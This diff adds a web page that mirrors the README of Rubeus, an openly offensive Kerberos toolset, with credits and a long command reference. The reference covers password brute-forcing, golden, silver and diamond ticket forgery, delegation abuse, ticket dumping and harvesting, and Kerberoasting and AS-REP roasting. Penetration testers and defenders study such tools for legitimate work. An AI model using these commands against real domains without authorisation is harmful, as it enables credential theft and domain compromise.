@@ -1,0 +1,259 @@
+<!doctype html>
+<html lang="en-GB">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src 'self' data:; style-src 'self'; script-src 'self'; base-uri 'self'; form-action 'self'; connect-src 'self'">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Rubeus - Breachcraft Dev</title>
+<meta name="description" content="Rubeus is a C# toolset for raw Kerberos interaction and abuses">
+<link rel="canonical" href="https://breachcraft.dev/tools/rubeus/">
+<link rel="icon" href="/assets/mark.svg" type="image/svg+xml">
+<link rel="stylesheet" href="/styles.css">
+<meta name="theme-color" content="#0b1014">
+</head>
+<body>
+<main>
+  <p class="brand">Breachcraft<span>Dev</span></p>
+  <p class="badge"><span>Azure tool</span> upstream README &middot; captured 22 Nov 2026</p>
+  <p class="kicker">Rubeus</p>
+  <h1>Rubeus</h1>
+  <p class="lede">Rubeus is a C# toolset for raw Kerberos interaction and abuses</p>
+  <h2>What it is</h2>
+<p>Rubeus is a C# toolset for raw Kerberos interaction and abuses. It is <strong>heavily</strong> adapted from <a href="https://twitter.com/gentilkiwi">Benjamin Delpy</a>'s <a href="https://github.com/gentilkiwi/kekeo/">Kekeo</a> project (CC BY-NC-SA 4.0 license) and <a href="https://twitter.com/mysmartlogon">Vincent LE TOUX</a>'s <a href="https://github.com/vletoux/MakeMeEnterpriseAdmin">MakeMeEnterpriseAdmin</a> project (GPL v3.0 license). Full credit goes to Benjamin and Vincent for working out the hard components of weaponization- without their prior work this project would not exist.</p>
+<p><a href="https://twitter.com/exploitph">Charlie Clark</a> and <a href="https://twitter.com/_EthicalChaos_">Ceri Coburn</a> have both made _significant_ contributions as co-developers to the Rubeus codebase. <a href="https://twitter.com/elad_shamir">Elad Shamir</a> contributed some essential work for resource-based constrained delegation. Their work is very appreciated!</p>
+<p>Rubeus also uses a C# ASN.1 parsing/encoding library from <a href="https://github.com/pornin">Thomas Pornin</a> named <a href="https://github.com/pornin/DDer">DDer</a> that was released with an "MIT-like" license. Huge thanks to Thomas for his clean and stable code!</p>
+<p>PKINIT code heavily adapted from <a href="https://twitter.com/SteveSyfuhs">@SteveSyfuhs</a>'s <a href="https://github.com/dotnet/Kerberos.NET">Bruce</a> tool. Bruce made RFC4556 (PKINIT) a lot easier to understand. Huge thanks to Steve!</p>
+<p>NDR encoding and decoding for Kerberos PAC is based on the <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/tree/master/NtApiDotNet">NtApiDotNet</a> library from <a href="https://twitter.com/tiraniddo">@tiraniddo</a>, thank you James.</p>
+<p>The <a href="https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110">KerberosRequestorSecurityToken.GetRequest</a>.aspx) method for Kerberoasting was contributed to PowerView (and then incorporated into Rubeus) by <a href="https://twitter.com/machosec">@machosec</a>.</p>
+<p><a href="https://twitter.com/harmj0y">@harmj0y</a> is the primary author of this code base.</p>
+<p>Rubeus is licensed under the BSD 3-Clause license.</p>
+<h3>Table of Contents</h3>
+<ul>
+<li>Rubeus</li>
+<li>Table of Contents</li>
+<li>Background</li>
+<li>Command Line Usage</li>
+<li>Opsec Notes</li>
+<li>Overview</li>
+<li>Weaponization</li>
+<li>Example: Credential Extraction</li>
+<li>Example: Over-pass-the-hash</li>
+<li>Ticket requests and renewals</li>
+<li>asktgt</li>
+<li>asktgs</li>
+<li>renew</li>
+<li>brute|spray</li>
+<li>Constrained delegation abuse</li>
+<li>s4u</li>
+<li>Ticket Forgery</li>
+<li>golden</li>
+<li>silver</li>
+<li>diamond</li>
+<li>Ticket Management</li>
+<li>ptt</li>
+<li>purge</li>
+<li>describe</li>
+<li>Ticket Extraction and Harvesting</li>
+<li>triage</li>
+<li>klist</li>
+<li>dump</li>
+<li>tgtdeleg</li>
+<li>monitor</li>
+<li>harvest</li>
+<li>Roasting</li>
+<li>kerberoast</li>
+<li>kerberoasting opsec</li>
+<li>Examples</li>
+<li>asreproast</li>
+<li>Miscellaneous</li>
+<li>createnetonly</li>
+<li>changepw</li>
+<li>hash</li>
+<li>tgssub</li>
+<li>currentluid</li>
+<li>logonsession</li>
+<li>asrep2kirbi</li>
+<li>kirbi</li>
+<li>Compile Instructions</li>
+<li>Targeting other .NET versions</li>
+<li>Sidenote: Building Rubeus as a Library</li>
+<li>Sidenote: Running Rubeus Through PowerShell</li>
+<li>Sidenote Sidenote: Running Rubeus Over PSRemoting</li>
+</ul>
+<h3>Background</h3>
+<h4>Command Line Usage</h4>
+<p>______        _ (___<strong> \      | | </strong>___) )_   _| |<strong>  </strong>___ _   _  ___</p>
+<pre><code>|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/</code></pre>
+<p>v2.3.3</p>
+<p>Ticket requests and renewals:</p>
+<p>Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID: Rubeus.exe asktgt /user:USER &lt;/password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH&gt; [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/proxyurl:<a href="https://KDC_PROXY/kdcproxy">https://KDC_PROXY/kdcproxy</a>] [/suppenctype:DES|RC4|AES128|AES256]</p>
+<p>Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID: Rubeus.exe asktgt /user:USER &lt;/password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH&gt; [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/proxyurl:<a href="https://KDC_PROXY/kdcproxy">https://KDC_PROXY/kdcproxy</a>] [/suppenctype:DES|RC4|AES128|AES256]</p>
+<p>Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session: Rubeus.exe asktgt /user:USER &lt;/password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH&gt; /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/opsec] [/nopac] [/proxyurl:<a href="https://KDC_PROXY/kdcproxy">https://KDC_PROXY/kdcproxy</a>] [/suppenctype:DES|RC4|AES128|AES256]</p>
+<p>Retrieve a TGT using a PCKS12 certificate, start a /netonly process, and to apply the ticket to the new process/logon session: Rubeus.exe asktgt /user:USER /certificate:C:\temp\leaked.pfx &lt;/password:STOREPASSWORD&gt; /createnetonly:C:\Windows\System32\cmd.exe [/getcredentials] [/servicekey:KRBTGTKEY] [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/proxyurl:<a href="https://KDC_PROXY/kdcproxy">https://KDC_PROXY/kdcproxy</a>] [/suppenctype:DES|RC4|AES128|AES256]</p>
+<p>Retrieve a TGT using a certificate from the users keystore (Smartcard) specifying certificate thumbprint or subject, start a /netonly process, and to apply the ticket to the new process/logon session: Rubeus.exe asktgt /user:USER /certificate:f063e6f4798af085946be6cd9d82ba3999c7ebac /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/suppenctype:DES|RC4|AES128|AES256] [/nowrap]</p>
+<p>Retrieve a TGT suitable for changing an account with an expired password using the changepw command Rubeus.exe asktgt /user:USER &lt;/password:PASSWORD /changepw [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH&gt; [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/proxyurl:<a href="https://KDC_PROXY/kdcproxy">https://KDC_PROXY/kdcproxy</a>]</p>
+<p>Request a TGT without sending pre-auth data: Rubeus.exe asktgt /user:USER [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/nopac] [/proxyurl:<a href="https://KDC_PROXY/kdcproxy">https://KDC_PROXY/kdcproxy</a>] [/suppenctype:DES|RC4|AES128|AES256]</p>
+<p>Request a service ticket using an AS-REQ: Rubeus.exe asktgt /user:USER /service:SPN &lt;/password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH&gt; [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/oldsam] [/proxyurl:<a href="https://KDC_PROXY/kdcproxy">https://KDC_PROXY/kdcproxy</a>] [/suppenctype:DES|RC4|AES128|AES256]</p>
+<p>Retrieve a service ticket for one or more SPNs, optionally saving or applying the ticket: Rubeus.exe asktgs &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; &lt;/service:SPN1,SPN2,...&gt; [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/enterprise] [/opsec] &lt;/tgs:BASE64 | /tgs:FILE.KIRBI&gt; [/targetdomain] [/u2u] [/targetuser] [/servicekey:PASSWORDHASH] [/asrepkey:ASREPKEY] [/proxyurl:<a href="https://KDC_PROXY/kdcproxy">https://KDC_PROXY/kdcproxy</a>]</p>
+<p>Retrieve a service ticket using the Kerberos Key List Request options: Rubeus.exe asktgs /keyList /service:KRBTGT_SPN &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/enterprise] [/opsec] &lt;/tgs:BASE64 | /tgs:FILE.KIRBI&gt; [/targetdomain] [/u2u] [/targetuser] [/servicekey:PASSWORDHASH] [/asrepkey:ASREPKEY] [/proxyurl:<a href="https://KDC_PROXY/kdcproxy">https://KDC_PROXY/kdcproxy</a>]</p>
+<p>Retrieve a delegated managed service account ticket: Rubeus.exe asktgs /dmsa /opsec /service:KRBTGT_SPN /targetuser:DMSA_ACCOUNT$ &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; [/dc:DOMAIN_CONTROLLER_Win2025] [/outfile:FILENAME] [/ptt] [/nowrap] [/servicekey:PASSWORDHASH] [/asrepkey:ASREPKEY] [/proxyurl:<a href="https://KDC_PROXY/kdcproxy">https://KDC_PROXY/kdcproxy</a>]</p>
+<p>Renew a TGT, optionally applying the ticket, saving it, or auto-renewing the ticket up to its renew-till limit: Rubeus.exe renew &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/autorenew] [/nowrap]</p>
+<p>Perform a Kerberos-based password bruteforcing attack: Rubeus.exe brute &lt;/password:PASSWORD | /passwords:PASSWORDS_FILE&gt; [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\USER &amp; /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose] [/nowrap]</p>
+<p>Perform a scan for account that do not require pre-authentication: Rubeus.exe preauthscan /users:C:\temp\users.txt [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/proxyurl:<a href="https://KDC_PROXY/kdcproxy">https://KDC_PROXY/kdcproxy</a>]</p>
+<p>Constrained delegation abuse:</p>
+<p>Perform S4U constrained delegation abuse: Rubeus.exe s4u &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; &lt;/impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI&gt; /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self] [/proxyurl:<a href="https://KDC_PROXY/kdcproxy">https://KDC_PROXY/kdcproxy</a>] [/createnetonly:C:\Windows\System32\cmd.exe] [/show] Rubeus.exe s4u /user:USER &lt;/rc4:HASH | /aes256:HASH&gt; [/domain:DOMAIN] &lt;/impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI&gt; /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self] [/bronzebit] [/nopac] [/proxyurl:<a href="https://KDC_PROXY/kdcproxy">https://KDC_PROXY/kdcproxy</a>] [/createnetonly:C:\Windows\System32\cmd.exe] [/show]</p>
+<p>Perform S4U constrained delegation abuse across domains: Rubeus.exe s4u /user:USER &lt;/rc4:HASH | /aes256:HASH&gt; [/domain:DOMAIN] &lt;/impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI&gt; /msdsspn:SERVICE/SERVER /targetdomain:DOMAIN.LOCAL /targetdc:DC.DOMAIN.LOCAL [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/self] [/nopac] [/createnetonly:C:\Windows\System32\cmd.exe] [/show]</p>
+<p>Ticket Forgery:</p>
+<p>Forge a golden ticket using LDAP to gather the relevent information: Rubeus.exe golden &lt;/des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH&gt; &lt;/user:USERNAME&gt; /ldap [/printcmd] [outfile:FILENAME] [/ptt]</p>
+<p>Forge a golden ticket using LDAP to gather the relevent information but explicitly overriding some values: Rubeus.exe golden &lt;/des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH&gt; &lt;/user:USERNAME&gt; /ldap [/dc:DOMAIN_CONTROLLER] [/domain:DOMAIN] [/netbios:NETBIOS_DOMAIN] [/sid:DOMAIN_SID] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/oldpac] [/extendedupndns] [/printcmd] [outfile:FILENAME] [/ptt]</p>
+<p>Forge a golden ticket, setting values explicitly: Rubeus.exe golden &lt;/des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH&gt; &lt;/user:USERNAME&gt; &lt;/domain:DOMAIN&gt; &lt;/sid:DOMAIN_SID&gt; [/dc:DOMAIN_CONTROLLER] [/netbios:NETBIOS_DOMAIN] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/oldpac] [/extendedupndns] [/printcmd] [outfile:FILENAME] [/ptt]</p>
+<p>Forge a silver ticket using LDAP to gather the relevent information: Rubeus.exe silver &lt;/des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH&gt; &lt;/user:USERNAME&gt; &lt;/service:SPN&gt; /ldap [/extendedupndns] [/nofullpacsig] [/printcmd] [outfile:FILENAME] [/ptt]</p>
+<p>Forge a silver ticket using LDAP to gather the relevent information, using the KRBTGT key to calculate the KDCChecksum and TicketChecksum: Rubeus.exe silver &lt;/des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH&gt; &lt;/user:USERNAME&gt; &lt;/service:SPN&gt; /ldap &lt;/krbkey:HASH&gt; [/krbenctype:DES|RC4|AES128|AES256] [/extendedupndns] [/nofullpacsig] [/printcmd] [outfile:FILENAME] [/ptt]</p>
+<p>Forge a silver ticket using LDAP to gather the relevent information but explicitly overriding some values: Rubeus.exe silver &lt;/des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH&gt; &lt;/user:USERNAME&gt; &lt;/service:SPN&gt; /ldap [/dc:DOMAIN_CONTROLLER] [/domain:DOMAIN] [/netbios:NETBIOS_DOMAIN] [/sid:DOMAIN_SID] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/authdata] [/extendedupndns] [/nofullpacsig] [/printcmd] [outfile:FILENAME] [/ptt]</p>
+<p>Forge a silver ticket using LDAP to gather the relevent information and including an S4U Delegation Info PAC section: Rubeus.exe silver &lt;/des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH&gt; &lt;/user:USERNAME&gt; &lt;/service:SPN&gt; /ldap [/s4uproxytarget:TARGETSPN] [/s4utransitedservices:SPN1,SPN2,...] [/printcmd] [outfile:FILENAME] [/ptt]</p>
+<p>Forge a silver ticket using LDAP to gather the relevent information and setting a different cname and crealm: Rubeus.exe silver &lt;/des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH&gt; &lt;/user:USERNAME&gt; &lt;/service:SPN&gt; /ldap [/cname:CLIENTNAME] [/crealm:CLIENTDOMAIN] [/printcmd] [outfile:FILENAME] [/ptt]</p>
+<p>Forge a silver ticket, setting values explicitly: Rubeus.exe silver &lt;/des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH&gt; &lt;/user:USERNAME&gt; &lt;/service:SPN&gt; &lt;/domain:DOMAIN&gt; &lt;/sid:DOMAIN_SID&gt; [/dc:DOMAIN_CONTROLLER] [/netbios:NETBIOS_DOMAIN] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/authdata] [/cname:CLIENTNAME] [/crealm:CLIENTDOMAIN] [/s4uproxytarget:TARGETSPN] [/s4utransitedservices:SPN1,SPN2,...] [/extendedupndns] [/nofullpacsig] [/printcmd] [outfile:FILENAME] [/ptt]</p>
+<p>Forge a diamond TGT by requesting a TGT based on a user password/hash: Rubeus.exe diamond /user:USER &lt;/password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH&gt; [/createnetonly:C:\Windows\System32\cmd.exe] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/krbkey:HASH] [/ticketuser:USERNAME] [/ticketuserid:USER_ID] [/groups:GROUP_IDS] [/sids:EXTRA_SIDS]</p>
+<p>Forge a diamond TGT by requesting a TGT using a PCKS12 certificate: Rubeus.exe diamond /user:USER /certificate:C:\temp\leaked.pfx &lt;/password:STOREPASSWORD&gt; [/createnetonly:C:\Windows\System32\cmd.exe] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/krbkey:HASH] [/ticketuser:USERNAME] [/ticketuserid:USER_ID] [/groups:GROUP_IDS] [/sids:EXTRA_SIDS]</p>
+<p>Forge a diamond TGT by requesting a TGT using tgtdeleg: Rubeus.exe diamond /tgtdeleg [/createnetonly:C:\Windows\System32\cmd.exe] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/krbkey:HASH] [/ticketuser:USERNAME] [/ticketuserid:USER_ID] [/groups:GROUP_IDS] [/sids:EXTRA_SIDS]</p>
+<p>Ticket management:</p>
+<p>Submit a TGT, optionally targeting a specific LUID (if elevated): Rubeus.exe ptt &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; [/luid:LOGINID]</p>
+<p>Purge tickets from the current logon session, optionally targeting a specific LUID (if elevated): Rubeus.exe purge [/luid:LOGINID]</p>
+<p>Parse and describe a ticket (service ticket or TGT): Rubeus.exe describe &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; [/servicekey:HASH] [/krbkey:HASH] [/asrepkey:HASH] [/serviceuser:USERNAME] [/servicedomain:DOMAIN] [/desplaintext:FIRSTBLOCKTEXT]</p>
+<p>Ticket extraction and harvesting:</p>
+<p>Triage all current tickets (if elevated, list for all users), optionally targeting a specific LUID, username, or service: Rubeus.exe triage [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM]</p>
+<p>List all current tickets in detail (if elevated, list for all users), optionally targeting a specific LUID: Rubeus.exe klist [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM]</p>
+<p>Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID: Rubeus.exe dump [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM] [/nowrap]</p>
+<p>Retrieve a usable TGT .kirbi for the current user (w/ session key) without elevation by abusing the Kerberos GSS-API, faking delegation: Rubeus.exe tgtdeleg [/target:SPN]</p>
+<p>Monitor every /interval SECONDS (default 60) for new TGTs: Rubeus.exe monitor [/interval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME] [/runfor:SECONDS]</p>
+<p>Monitor every /monitorinterval SECONDS (default 60) for new TGTs, auto-renew TGTs, and display the working cache every /displayinterval SECONDS (default 1200): Rubeus.exe harvest [/monitorinterval:SECONDS] [/displayinterval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME] [/runfor:SECONDS]</p>
+<p>Roasting:</p>
+<p>Perform Kerberoasting: Rubeus.exe kerberoast [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]</p>
+<p>Perform Kerberoasting, outputting hashes to a file: Rubeus.exe kerberoast /outfile:hashes.txt [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps]</p>
+<p>Perform Kerberoasting, outputting hashes in the file output format, but to the console: Rubeus.exe kerberoast /simple [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]</p>
+<p>Perform Kerberoasting with alternate credentials: Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]</p>
+<p>Perform Kerberoasting with an existing TGT: Rubeus.exe kerberoast &lt;/spn:"blah/blah" | /spns:C:\temp\spns.txt&gt; &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; [/nowrap]</p>
+<p>Perform Kerberoasting with an existing TGT using an enterprise principal: Rubeus.exe kerberoast &lt;/spn:user@domain.com | /spns:user1@domain.com,user2@domain.com&gt; /enterprise &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; [/nowrap]</p>
+<p>Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal if any fail: Rubeus.exe kerberoast &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /autoenterprise [/ldaps] [/nowrap]</p>
+<p>Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts: Rubeus.exe kerberoast /usetgtdeleg [/ldaps] [/nowrap]</p>
+<p>Perform "opsec" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts: Rubeus.exe kerberoast /rc4opsec [/ldaps] [/nowrap]</p>
+<p>List statistics about found Kerberoastable accounts without actually sending ticket requests: Rubeus.exe kerberoast /stats [/ldaps] [/nowrap]</p>
+<p>Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter): Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/ldaps] [/nowrap]</p>
+<p>Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets: Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/ldaps] [/nowrap]</p>
+<p>Perform Kerberoasting, with a delay of 5000 milliseconds and a jitter of 30%: Rubeus.exe kerberoast /delay:5000 /jitter:30 [/ldaps] [/nowrap]</p>
+<p>Perform AES Kerberoasting: Rubeus.exe kerberoast /aes [/ldaps] [/nowrap]</p>
+<p>Perform Kerberoasting using an account without pre-auth by sending AS-REQ's: Rubeus.exe kerberoast &lt;/spn:""blah/blah"" | /spns:C:\temp\spns.txt&gt; /nopreauth:USER /domain:DOMAIN [/dc:DOMAIN_CONTROLLER] [/nowrap]</p>
+<p>Perform AS-REP "roasting" for any users without preauth: Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/des] [/nowrap]</p>
+<p>Perform AS-REP "roasting" for any users without preauth, outputting Hashcat format to a file: Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/des]</p>
+<p>Perform AS-REP "roasting" for any users without preauth using alternate credentials: Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU,..."] [/ldaps] [/des] [/nowrap]</p>
+<p>Miscellaneous:</p>
+<p>Create a hidden program (unless /show is passed) with random /netonly credentials, displaying the PID and LUID: Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" [/show] [/ticket:BASE64 | /ticket:FILE.KIRBI]</p>
+<p>Reset a user's password from a supplied TGT (AoratoPw): Rubeus.exe changepw &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /new:PASSWORD [/dc:DOMAIN_CONTROLLER] [/targetuser:DOMAIN\USERNAME]</p>
+<p>Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1, and des_cbc_md5 hashes: Rubeus.exe hash /password:X [/user:USER] [/domain:DOMAIN]</p>
